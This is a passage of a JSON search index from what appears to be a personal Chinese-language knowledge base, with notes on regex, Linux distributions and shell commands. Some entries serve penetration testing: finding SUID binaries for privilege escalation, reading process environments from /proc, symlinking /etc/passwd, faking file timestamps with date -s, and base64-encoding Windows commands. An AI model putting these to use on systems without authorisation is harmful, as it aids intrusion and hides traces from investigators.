\u5339\u914d\u540e\u9762\u4e0d\u662fexp\u7684\u4f4d\u7f6e (?&lt;!exp) \u5339\u914d\u524d\u9762\u4e0d\u662fexp\u7684\u4f4d\u7f6e","tags":["IT/Python","IT/Splunk"]},{"location":"Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_12","title":"\u6ce8\u91ca","text":"<p><code>(?#comment)</code>\uff1a\u4e0d\u5bf9\u6b63\u5219\u5904\u7406\u4ea7\u751f\u4efb\u4f55\u5f71\u54cd\uff0c\u4ec5\u6ce8\u91ca\u6548\u679c\u3002</p>","tags":["IT/Python","IT/Splunk"]},{"location":"Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_13","title":"\u61d2\u60f0&amp;\u8d2a\u5a6a","text":"\u8bed\u6cd5 \u8bf4\u660e *? \u91cd\u590d\u4efb\u610f\u6b21\uff0c\u4f46\u5c3d\u53ef\u80fd\u5c11\u5339\u914d +? \u91cd\u590d1\u6b21\u4ee5\u4e0a\uff0c\u4f46\u5c3d\u53ef\u80fd\u5c11\u5339\u914d ?? \u91cd\u590d0\u62161\u6b21\uff0c\u4f46\u5c3d\u53ef\u80fd\u5c11\u5339\u914d {n,m}? \u91cd\u590dn\u5230m\u6b21\uff0c\u4f46\u5c3d\u53ef\u80fd\u5c11\u5339\u914d {n,}? \u91cd\u590dn\u6b21\u4ee5\u4e0a\uff0c\u4f46\u5c3d\u53ef\u80fd\u5c11\u5339\u914d <ul> <li><code>a.*?b</code>\u5339\u914d\u6700\u77ed\u7684\uff0c\u4ee5a\u5f00\u59cb\uff0c\u4ee5b\u7ed3\u675f\u7684\u5b57\u7b26\u4e32\u3002\u5982\u679c\u628a\u5b83\u5e94\u7528\u4e8eaabab\u7684\u8bdd\uff0c\u5b83\u4f1a\u5339\u914daab\uff08\u7b2c\u4e00\u5230\u7b2c\u4e09\u4e2a\u5b57\u7b26\uff09\u548cab\uff08\u7b2c\u56db\u5230\u7b2c\u4e94\u4e2a\u5b57\u7b26\uff09\u2014\u2014\u4e3a\u4ec0\u4e48\u7b2c\u4e00\u4e2a\u5339\u914d\u662faab\uff08\u7b2c\u4e00\u5230\u7b2c\u4e09\u4e2a\u5b57\u7b26\uff09\u800c\u4e0d\u662fab\uff08\u7b2c\u4e8c\u5230\u7b2c\u4e09\u4e2a\u5b57\u7b26\uff09\uff1f\u2014\u2014\u7b80\u5355\u5730\u8bf4\uff0c\u56e0\u4e3a\u6b63\u5219\u8868\u8fbe\u5f0f\u6709\u53e6\u4e00\u6761\u89c4\u5219\uff0c\u6bd4\u61d2\u60f0/\u8d2a\u5a6a\u89c4\u5219\u7684\u4f18\u5148\u7ea7\u66f4\u9ad8\uff0c\u5373\uff1a\u6700\u5148\u5f00\u59cb\u7684\u5339\u914d\u62e5\u6709\u6700\u9ad8\u7684\u4f18\u5148\u6743\u2014\u2014The match that begins earliest wins\u3002</li> </ul>","tags":["IT/Python","IT/Splunk"]},{"location":"Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_14","title":"\u5b66\u4e60\u94fe\u63a5","text":"<ul> <li>\u5404\u79cd\u6b63\u5219\u5f15\u64ce\uff08Flavor\uff09\u7684\u533a\u522b</li> <li>Python\u6b63\u5219\u8868\u8fbe\u5f0f\u6307\u5357</li> <li>30\u5206\u949f\u5165\u95e8</li> <li>splunk\u6587\u6863</li> </ul>","tags":["IT/Python","IT/Splunk"]},{"location":"Resources/Linux/Linux%E5%8F%91%E8%A1%8C%E7%89%88/","title":"Linux\u53d1\u884c\u7248","text":"<p>\u5173\u4e8eLinux\u53d1\u884c\u7248</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%8F%91%E8%A1%8C%E7%89%88/#debain","title":"Debain\u7cfb\u5217","text":"<ul> <li>Debian\uff1a\u539f\u59cb\u53d1\u884c\u7248\uff0c\u6ce8\u91cd\u7a33\u5b9a\u6027\u548c\u81ea\u7531\u8f6f\u4ef6\u3002</li> <li>Ubuntu\uff1a\u57fa\u4e8e Debian\uff0c\u6ce8\u91cd\u7528\u6237\u53cb\u597d\u6027\u548c\u6613\u7528\u6027\u3002</li> <li>kali linux</li> <li>Linux Mint\uff1a\u57fa\u4e8e Ubuntu\uff0c\u6ce8\u91cd\u684c\u9762\u4f53\u9a8c\u3002</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%8F%91%E8%A1%8C%E7%89%88/#redhat","title":"Redhat\u7cfb\u5217","text":"<ul> <li>\u793e\u533a\u7248\uff1a<ul> <li>Fedora\uff1a\u7531 Red Hat \u8d5e\u52a9\uff0c\u662f RHEL \u7684\u4e0a\u6e38\u6e90\uff0c\u7279\u8272\u662f\u6700\u65b0\u7684\u6280\u672f\u548c\u8f6f\u4ef6\u3002</li> <li>CentOS\uff1aRHEL \u7684\u514d\u8d39\u514b\u9686\u7248\u672c\uff08\u76f4\u5230CentOS8\uff09<ul> <li>CentOS Stream\uff1a\u662f\u4e00\u4e2a\u6eda\u52a8\u53d1\u884c\u7248\uff0c\u4f4d\u4e8e Fedora \u548c RHEL \u4e4b\u95f4\uff0c\u7528\u4e8e\u9884\u89c8\u5373\u5c06\u8fdb\u5165 RHEL \u7684\u5185\u5bb9\u3002</li> </ul> </li> </ul> </li> <li>\u5546\u4e1a\u7248\uff1aRed Hat Enterprise Linux\uff08RHEL\uff09<ul> <li>\u786e\u8ba4RHEL\u8ba2\u9605\uff1a<code>subscription-manager list [--consumed]</code></li> </ul> </li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%8F%91%E8%A1%8C%E7%89%88/#_1","title":"Linux\u53d1\u884c\u7248","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%90%84%E7%A7%8D%E6%8B%AC%E5%8F%B7/","title":"Linux\u5404\u79cd\u62ec\u53f7","text":"<p>https://pikesaku.hatenablog.com/entry/2016/11/23/160156</p> <p></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%90%84%E7%A7%8D%E6%8B%AC%E5%8F%B7/#_1","title":"\u5927\u62ec\u53f7","text":"<p>\u53d8\u91cf\u66ff\u6362\u2014\u2014\u539f\u578b\u53d8\u91cf\u3002<code>${var}</code>\u8fd9\u79cd\uff0c\u65e0\u6cd5\u66ff\u6362cat\u5230\u7684\u53d8\u91cf\uff0c\u56e0\u4e3a\u8fd9\u662f\u201c\u53d8\u91cf\u201d\u66ff\u6362\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%90%84%E7%A7%8D%E6%8B%AC%E5%8F%B7/#_2","title":"\u5c0f\u62ec\u53f7","text":"<p>\u547d\u4ee4\u66ff\u6362\uff1a<code>$(ls)</code>\u2014\u2014\u53ea\u6709\u6807\u51c6\u8f93\u51fa\uff08stdout\uff09\u624d\u80fd\u88ab\u66ff\u6362\uff0c\u9519\u8bef\u8f93\u51fa\u4e0d\u884c\u3002 \u8fdb\u7a0b\u66ff\u6362\uff1a<code>&lt;(CMD)</code> ^97ed2e</p> <p></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%90%84%E7%A7%8D%E6%8B%AC%E5%8F%B7/#_3","title":"\u53cc\u62ec\u53f7","text":"<p>\u6d41\u7a0b\u63a7\u5236\u5e38\u7528</p> <ul> <li> <p><code>$(())</code> \u7b97\u6570\u3001\u6570\u5b66\u8ba1\u7b97</p> </li> <li> <p>0\u4e3afalse</p> </li> <li> <p><code>[](&lt;#&gt;)</code> \u5f53\u4f5c\u6574\u4f53\u5224\u65ad</p> </li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/","title":"Linux\u547d\u4ee4","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_1","title":"\u547d\u4ee4\u89e3\u91ca\u7f51\u5740","text":"<p>https://explainshell.com/</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_2","title":"\u7ec8\u7aef\u5feb\u6377\u952e","text":"<ul> <li><code>ctrl+w</code> \u5220\u5de6\u8bcd</li> <li><code>alt+d</code> \u5220\u53f3\u8bcd</li> <li><code>ctrl+u</code> \u5220\u5230\u5934</li> <li><code>ctrl+k</code> \u5220\u5230\u5c3e</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_3","title":"\u73af\u5883\u53d8\u91cf","text":"<ul> <li><code>env</code>\uff1a\u663e\u793a\u73af\u5883\u53d8\u91cf</li> <li> <p><code>set</code>\uff1a\u663e\u793a\u73af\u5883\u53d8\u91cf\u548cshell\u53d8\u91cf</p> </li> <li> <p>\u73af\u5883\u53d8\u91cf\uff1a\u7ee7\u627f\u7ed9\u5b50\u8fdb\u7a0b\u7684\u53d8\u91cf\u3002\u5b50\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u4e0e\u7236\u8fdb\u7a0b\u65e0\u5173\u3002</p> </li> <li>shell\u53d8\u91cf\uff1a\u53ea\u5728\u5f53\u524dshell\u6709\u6548\u7684\u53d8\u91cf\uff0c\u4e0d\u7ee7\u627f\u7ed9\u5b50\u8fdb\u7a0b\u3002</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_4","title":"\u67e5\u770b\u6307\u5b9a\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf","text":"<ul> <li><code>cat /proc/{pid}/environ</code></li> <li><code>cat /proc/1229/environ | sed -e 's/\\x00/\\n/g'</code><ul> <li>\u628a\u9ed8\u8ba4\u7684\u95f4\u9694NULL (\\x00)\u00a0\u66ff\u6362\u6210\u6362\u884c</li> </ul> </li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_5","title":"\u672a\u5206\u7c7b","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#jar","title":"jar","text":"<p>\u5217\u51faJAR\u6587\u4ef6\u7684\u5185\u5bb9\uff1a<code>jar tf myapp.jar</code></p> <p>\u5728JAR\u6587\u4ef6\u4e2d\u7684\u6587\u672c\u6587\u4ef6\u4e2d\u641c\u7d22\u5173\u952e\u5b57\uff1a</p> <ul> <li><code>jar xf myapp.jar some/text/file.txt</code></li> <li><code>grep \"search_term\" some/text/file.txt</code></li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#iconv","title":"iconv","text":"<ul> <li>iconv\uff1a\u5373\"\u5b57\u7b26\u96c6\u8f6c\u6362\"\u3002</li> <li>\u8bed\u6cd5\uff1a<code>iconv -f source_encoding -t target_encoding input_file &gt; output_file</code></li> <li>\u5bf9Windows\u5b9e\u7528\uff08\u8f6c\u4e3aUTF-16LE\uff09\uff1a<code>echo -en \"[Command]\" | iconv -t UTF-16LE | base64 -w 0</code> ^f44db6</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#man","title":"man","text":"\u90e8\u5206 \u5185\u5bb9 1 \u7528\u6237\u6307\u4ee4 2 \u5185\u6838\u7cfb\u7edf\u8c03\u7528\u7684\u7f16\u7a0b\u63a5\u53e3 3 C\u5e93\u7684\u7f16\u7a0b\u63a5\u53e3 4 \u7279\u6b8a\u6587\u4ef6\u3002\u5982\u8bbe\u5907\u8282\u70b9\u548c\u9a71\u52a8\u7a0b\u5e8f 5 \u6863\u6848\u683c\u5f0f 6 \u5c4f\u5e55\u4fdd\u62a4\u7a0b\u5e8f\u7b49\u6e38\u620f\u548c\u5a31\u4e50 7 \u6742 8 \u7cfb\u7edf\u7ba1\u7406\u547d\u4ee4","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#dollar-sign","title":"dollar sign","text":"<p><code>$'\u2026'</code></p> <p><code>echo $'{\\\"username\\\":\\\"a\\\",\\\"password\\\":\\\"a\\\"}'</code></p> <p></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_6","title":"\u6587\u4ef6\u548c\u76ee\u5f55\u7ba1\u7406","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#mv","title":"mv","text":"<p>[!NOTE] \u6ce8\u610f\u8986\u76d6\u6743\u9650 #\u6e17\u900f/\u5229\u7528  \u6587\u4ef6\u662f\u5426\u80fd\u88ab\u8986\u76d6\uff0c\u4e0d\u662f\u53d6\u51b3\u4e8e\u6587\u4ef6\u7684\u6743\u9650\uff0c\u800c\u662f\u76ee\u6807\u6587\u4ef6\u7684\u76ee\u5f55\u6743\u9650\u3002\u76ee\u5f55\u6743\u9650\u80fd\u5199\u5165\u7684\u8bdd\uff0c\u5219\u7528\u6237\u80fd\u9009\u62e9\u662f\u5426\u8986\u76d6\u76ee\u6807\u6587\u4ef6\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#realpath","title":"realpath","text":"<p>\u7528\u4e8e\u5c06\u76f8\u5bf9\u8def\u5f84\u6216\u7b26\u53f7\u94fe\u63a5\u8f6c\u6362\u6210\u7edd\u5bf9\u8def\u5f84\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#stat","title":"stat","text":"<p>\u53ef\u7528<code>stat &lt;\u6587\u4ef6\u540d&gt;</code>\u67e5\u8be2inode\u4fe1\u606f\u3002</p> <p>\u6587\u4ef6\u65f6\u95f4\u6233</p> <ul> <li>atime\uff1aAccess\uff0c\u6587\u4ef6\u6253\u5f00</li> <li>mtime\uff1aModify\uff0c\u6587\u4ef6\u5185\u5bb9\u53d8\u52a8 ^fda64b</li> <li> <p>ctime\uff1aChange\uff0cinode\u53d8\u52a8\u2014\u2014\u5373\u6587\u4ef6\u5c5e\u6027\uff08\u6743\u9650\u3001\u6240\u6709\u6743\u7b49\uff09\u53d8\u52a8\u65f6ctime\u4f1a\u53d8\u3002\u4e00\u822c\u6765\u8bf4\u6587\u4ef6\u521b\u5efa\u7684\u65f6\u95f4\u4e5f\u5dee\u4e0d\u591a\u662finode\u521b\u5efa\u7684\u65f6\u95f4</p> <ul> <li>ls -l \u9ed8\u8ba4\u663e\u793a\u7684\u662fctime</li> <li>\u7531\u4e8e\u662f\u8d34\u4e0a\u7cfb\u7edf\u65f6\u95f4\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528 <code>date -s</code> \u6539\u7cfb\u7edf\u65f6\u95f4\u540e\u518d\u64cd\u4f5c</li> </ul> </li> <li> <p> grep IO`</p> </li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#touch","title":"touch","text":"<p>touch\u5df2\u5b58\u5728\u7684\u6587\u4ef6\u6216\u76ee\u5f55\u65f6\u4f1a\u5237\u65b0\u65f6\u95f4\u3002<code>touch /*</code> \u5237\u65b0\u6240\u6709\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#mkdir","title":"mkdir","text":"<p><code>mkdir -p</code>\uff1a\u9012\u5f52\u521b\u5efa</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_7","title":"\u63d0\u53d6\u6587\u4ef6\u540d/\u6587\u4ef6\u5939\u540d","text":"<ul> <li><code>basename [pathname] [suffix]</code></li> <li><code>dirname [pathname]</code></li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_8","title":"\u8f6f\u94fe\u63a5","text":"<p><code>ln -s &lt;\u76ee\u6807\u6587\u4ef6&gt; &lt;\u94fe\u63a5\u540d&gt;</code></p> <p>\u5982\uff1a<code>ln -s /etc/passwd the_symlink</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#find","title":"find","text":"<p><code>find / -name '*.c'</code></p> <ul> <li><code>-name</code>\uff1a\u641c\u7d22\u6587\u4ef6\u540d</li> <li><code>-i</code>\uff1a\u4e0d\u533a\u5206\u5927\u5c0f\u5199</li> <li><code>-type d</code>\uff1a\u627e\u6587\u4ef6\u5939</li> <li><code>-user</code>\uff1a\u6309\u6587\u4ef6\u5c5e\u4e3b\u67e5\u627e</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_9","title":"\u6839\u636e\u65f6\u95f4\u67e5\u627e","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_10","title":"\u76f8\u5bf9\u65f6\u95f4","text":"<ul> <li>find -mtime [+/-] n\uff1a\u4ece\u5f53\u524d\u65f6\u523b\u5f00\u59cb\u63a8\uff0c<ul> <li>0\uff1a\u5f53\u524d\u65f6\u95f4\u5f80\u524d\u63a8\uff0c\u8fc7\u53bb24h\u5185</li> <li>n\uff1a\u5f53\u524d\u65f6\u95f4\u5f80\u524d\u63a8\uff0cn\u5929\u524d\u7684\u8fc7\u53bb24h\u5185</li> <li>\u6b63\u8d1f\u8868\u793a\u6307\u5b9a\u65f6\u523b\u7684\u65b9\u5411\u7684\u5168\u90e8\uff1a+\u4e3a\u5de6\uff08\u4ee5\u5916\uff0c\u8fc7\u53bb\u7684\u8fc7\u53bb\uff09\uff0c-\u4e3a\u53f3\uff08\u4ee5\u5185\uff0c\u8fc7\u53bb\u7684\u5c06\u6765\uff09<ul> <li>+n\uff1a\u8d85\u8fc7n\u5929\u524d\u7684</li> <li>-n\uff1an\u5929\u5185\u7684\uff08\u5305\u62ec\u4eca\u5929\uff09</li> </ul> </li> </ul> </li> </ul> <pre><code>+2 \u2190---|--2--|--------\u2192 -2\n\n--|-----|-----|-----|-----|\n  4     3     2     1     0(\u73b0\u5728)\n</code></pre>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_11","title":"\u7edd\u5bf9\u65f6\u95f4\uff08\u7279\u5b9a\u65f6\u95f4\uff09","text":"<ul> <li><code>find /path/to/search -type f -newermt \"YYYY-MM-DD HH:MM:SS\"</code></li> </ul> <p>[!NOTE] \u5173\u4e8e\u6392\u67e5 \u9ed1\u5ba2\u53ef\u80fd\u53ea\u4fee\u6539\u4e86mtime\uff0c\u800c\u5fd8\u4e86ctime\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_12","title":"\u6392\u9664\u641c\u7d22","text":"<p>\u4ec5\u5c06\u8f93\u51fa\u7ed3\u679c\u8fc7\u6ee4\uff0c\u4f9d\u65e7\u4f1a\u904d\u5386\u6240\u6709\u4e0d\u9700\u8981\u7684\u76ee\u5f55\u3002</p> <ul> <li><code>find -name \"*.js\" -not -path \"./directory/*\"</code><ul> <li><code>-not</code>\u53ef\u4ee5\u66ff\u6362\u4e3a\u611f\u53f9\u53f7\uff08<code>!</code>\uff09</li> <li>\u9700\u8981\u6307\u5b9a\u6392\u9664\u591a\u4e2a\u5219\u7528\u5982\u4e0b\u547d\u4ee4\uff08\u4f7f\u7528\u8f6c\u4e49\u7684\u5c0f\u62ec\u53f7\uff09</li> </ul> </li> </ul> <pre><code>find / \\( -path /proc -o -path /run \\) -prune -o \\( -user $(id -un) -o -group $(id -gn) \\) -type f -ls 2&gt;/dev/null\n</code></pre> <ul> <li><code>-path</code>\uff1a\u5339\u914d\u8def\u5f84pattern\uff0c\u53ef\u4ee5\u7528\u901a\u914d\u7b26\u3002</li> <li><code>-o</code>\uff1a\u6216</li> <li><code>-prune</code>\uff1a\u6392\u9664</li> <li><code>-ls</code>\uff1a\u539f\u6765\u8fd9\u4e2a\u53ef\u4ee5\u5217\u51fa\u8be6\u7ec6\u4fe1\u606f\uff0c\u4e0d\u7528<code>-exec</code>\u7684\u65b9\u5f0f\u4e86\u3002</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#suid","title":"\u627e\u8bbe\u7f6e\u4e86SUID\u7684\u6587\u4ef6","text":"<ul> <li><code>find / -perm -u=s -type f 2&gt;/dev/null</code></li> <li><code>find / -user root -perm -4000 2&gt;/dev/null</code> (\u4f46\u662f\u6ce8\u610f\u6709\u65f6\u5019\u53ef\u80fd\u53ef\u4ee5\u6a2a\u5411\u79fb\u52a8\u6240\u4ee5\u4e0d\u53ea\u627eroot)<ul> <li>\u5e38\u7528\uff1a<code>find / -perm -4000 2&gt;/dev/null -exec ls -l {} \\;</code><ul> <li>\u8fdb\u5316/\u7b80\u5199\uff1a<code>find / -perm -4000 -ls 2&gt;/dev/null</code></li> </ul> </li> </ul> </li> </ul> <p>\u6839\u636eman\u624b\u518c\uff1a</p> <ul> <li>\u5c3d\u91cf\u7528 <code>/</code> \u4ee3\u66ff <code>+</code></li> <li>-perm 664\uff1a\u7cbe\u51c6\u67e5\u627e664</li> <li>-perm -664\uff1a\u67e5\u627e\u6743\u9650\u81f3\u5c11\u4e3a664\u7684\uff0c\u5982\u4f1a\u5339\u914d\u51fa0777</li> <li>-perm /222\uff1a\u67e5\u627e\u4efb\u610f\u4e00\u4e2a\u6743\u9650\u4e3a2\u7684\uff08\u5373-perm /220\u7ed3\u679c\u4e5f\u4e00\u6837\uff09</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#-exec","title":"-exec","text":"<p><code>-exec COMMAND \"{}\" \\; -quit</code></p> <ul> <li>\u82b1\u62ec\u53f7\u4e24\u8fb9\u4e5f\u53ef\u4ee5\u4e0d\u7528\u53cc\u5f15\u53f7</li> <li>\u4ee5\u5206\u53f7\u8868\u793a\u547d\u4ee4\u7ed3\u675f\uff0c\u4f46\u907f\u514d\u610f\u5916\u6240\u4ee5\u4e00\u822c\u52a0\u4e0a\u53cd\u659c\u6760\u8f6c\u4e49</li> <li>\u82b1\u62ec\u53f7\u91cc\u4e3a-exec\u524d\u9762\u547d\u4ee4\u7684\u7ed3\u679c</li> <li>\u53ea\u6709\u90e8\u5206\u547d\u4ee4\u540e\u6709-exec\u9009\u9879\u3002\u5982find</li> <li>-quit\uff1a\u5339\u914d\u5230\u4e00\u4e2a\u7ed3\u679c\u5c31\u505c\u6b62</li> </ul> <p><code>find /Documents -type f -exec grep -H Milledgeville {} \\;</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#grep","title":"grep","text":"<ul> <li>\u4ec5\u8f93\u51fa\u5339\u914d\u5185\u5bb9\u800c\u975e\u6574\u884c\uff1a<code>grep -o</code></li> <li>\u5c06\u5339\u914dpattern\u5199\u5728\u6587\u4ef6\uff1a<code>grep -f &lt;pattern_file&gt;</code></li> <li> <p>\u663e\u793a\u5339\u914d\u884c\u4e4b\u540e\u7684n\u884c\uff1a<code>grep -A n \"pattern\" file</code></p> </li> <li> <p><code>egrep\u00a0 {pattern} {\u6587\u4ef6}</code>\uff1a\u540cgrep -E</p> <p>[!NOTE] \u6709\u65f6egrep\u6bd4grep\u5feb\uff08egrep\u6309\u539f\u6837\u5904\u7406meta\u5b57\u7b26\u800c\u65e0\u9700\u8f6c\u4e49\uff09</p> </li> <li> <p><code>fgrep</code>\u662f\u5355\u7eaf\u641c\u5b57\u7b26\u4e32\uff08\u6548\u7387\u9ad8\u4e9b\uff09\uff0c\u800c\u4e0d\u4f1a\u628a\u7279\u6b8a\u7b26\u53f7\u770b\u505a\u6b63\u5219\u8868\u8fbe\u3002</p> <ul> <li>\u548c \"grep -F\" \u4e00\u6837</li> <li>\u6ca1\u6709<code>{\u6587\u4ef6}</code>\u5219\u8bfb\u53d6\u6807\u51c6\u8f93\u5165</li> </ul> </li> </ul> <p>\u8981grep\u5e26\u4e24\u4e2a\u77ed\u6a2a\u7ebf<code>--</code>\u7684\uff08\u5982help\u9875\u9762\uff09\uff0c\u4e0d\u80fd\u76f4\u63a5\u641c<code>\"--\"</code>\u800c\u9700\u8981<code>grep -- \"--\"</code>\uff1a </p> <ul> <li>\u53ef\u5bf9\u538b\u7f29\u6587\u4ef6\u7684grep\uff08\u5bf9\u672a\u538b\u7f29\u6587\u4ef6\u4e5f\u6709\u6548\uff09\uff1a<code>zgrep\u00a0 {pattern} {\u6587\u4ef6}</code>\u3002  ^02828b</li> <li>\u8fc7\u6ee4\u7a7a\u884c(<code>^$</code>)\u548c<code>#</code>\uff1a<code>egrep -vn \"^$|#\"</code>\u3001<code>grep -Evn \"^$|#\"</code><ul> <li><code>^$|#</code>\u7684<code>|</code>\u4e24\u8fb9\u4e0d\u80fd\u6709\u7a7a\u683c\uff01\u4f1a\u88ab\u8bc6\u522b\u8fdbpattern\u91cc</li> <li><code>$</code>\u8868\u793a\u7ed3\u5c3e\uff0c\u7a7a\u884c\u7684\u8bdd\u5b9e\u9645\u4e0a\u6709\u4e2a<code>$</code>\uff08<code>cat -e</code>\u53ef\u77e5\uff09</li> <li><code>|</code>\u662f\u903b\u8f91\u6216</li> <li><code>-n</code>\u8f93\u51fa\u5bf9\u5e94\u7684\u884c\u53f7</li> </ul> </li> </ul> <p>\u8e29\u5751\uff1a</p> <ul> <li>grep\u641c\u4e0d\u5230\u7ed3\u679c\u5219rc\u4e3a1\uff0c\u6240\u4ee5\u8981\u5c0f\u5fc3\u4f7f\u7528<code>set -e</code>\uff08\u4e0d\u8fc7\u5e94\u8be5\u53ef\u4ee5\u7528\u547d\u4ee4\u66ff\u6362\u2014\u2014\u5b50shell\uff09</li> <li><code>grep -f</code>\u65e0\u7ed3\u679c\u3002\u8003\u8651f\u6587\u4ef6\u662f\u5426\u4ecewindow\u4f20\u8f93\u800c\u6765\u3002\u5373\u4f7f\u7528awk\u6574\u7406\uff0c\u4f46\u6362\u884c\u7b26\u672a\u5904\u7406\uff1a\uff1a\u6362\u884c\u7b26#\u8f6c\u6362\u4e0e\u5220\u9664</li> <li><code>tail -f</code>\u7684\u591a\u4e2agrep\u6709\u65f6\u65e0\u6cd5\u8f93\u51fa\u90e8\u5206\u7ed3\u679c\u2014\u2014\u7528\u884c\u7f13\u51b2\u89e3\u51b3<code>grep --line-buffered</code>\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5f53\u6807\u51c6\u8f93\u51fa\u662f\u7ec8\u7aef\u65f6\u8f93\u51fa\u662f\u884c\u7f13\u51b2\u7684\uff0c\u5426\u5219\u662f\u5757\u7f13\u51b2\u2014\u2014\u5373\u8fbe\u5230\u4e00\u5b9a\u7684\u6570\u636e\u91cf\uff0c\u4e00\u822c\u662f4~64KB\uff0c\u5982grep\u547d\u4ee4\u5728\u4e2d\u95f4\u65f6\uff09<ul> <li>[x] piping-of-grep-is-not-working-with-tail</li> <li>[ ] how-to-grep-a-continuous-stream</li> </ul> </li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#zipgrep","title":"zipgrep","text":"<p>\u641c\u7d22\u5305\u542b\u5728ZIP\u6587\u4ef6\u4e2d\u7684\u6587\u672c\u6587\u4ef6\uff0c\u5b83\u4f1a\u89e3\u538b\u7f29ZIP\u6587\u4ef6\u5e76\u5728\u5176\u4e2d\u641c\u7d22\u6587\u672c\u3002</p> <ul> <li>\u5bf9\u6bd4\uff1azgrep\u4e0d\u4f1a\u89e3\u538b\u6574\u4e2a\u6587\u4ef6\uff0c\u800c\u662f\u5728\u538b\u7f29\u6587\u4ef6\uff08<code>.gz</code>\uff09\u4e2d\u76f4\u63a5\u641c\u7d22\u6587\u672c\u3002</li> <li>\u5bf9\u4e8e\u5728JAR\u6587\u4ef6\u5185\u641c\u7d22\u6587\u672c\uff0c\u5e94\u8be5\u4f7f\u7528<code>zipgrep</code>\u547d\u4ee4\uff0c\u56e0\u4e3aJAR\u6587\u4ef6\u5b9e\u9645\u4e0a\u662fZIP\u683c\u5f0f\u7684\u538b\u7f29\u6587\u4ef6\uff0c\u5176\u4e2d\u5305\u542bJava\u7c7b\u6587\u4ef6\u548c\u5176\u4ed6\u8d44\u6e90\u3002</li> </ul> <p>[!NOTE] .gz\u548c.zip 1. \u538b\u7f29\u7b97\u6cd5\uff1a   - <code>.gz</code>\u6587\u4ef6\u4f7f\u7528\u7684\u662fGZIP\u538b\u7f29\u7b97\u6cd5\uff0c\u8fd9\u662f\u4e00\u79cd\u5e7f\u6cdb\u4f7f\u7528\u7684\u538b\u7f29\u6280\u672f\uff0c\u7279\u522b\u662f\u5728Unix\u548cLinux\u7cfb\u7edf\u4e2d\u3002GZIP\u65e8\u5728\u63d0\u4f9b\u9ad8\u6548\u7684\u6570\u636e\u538b\u7f29\uff0c\u800c\u4e0d\u662f\u6253\u5305\u6216\u5f52\u6863\u591a\u4e2a\u6587\u4ef6\u3002   - 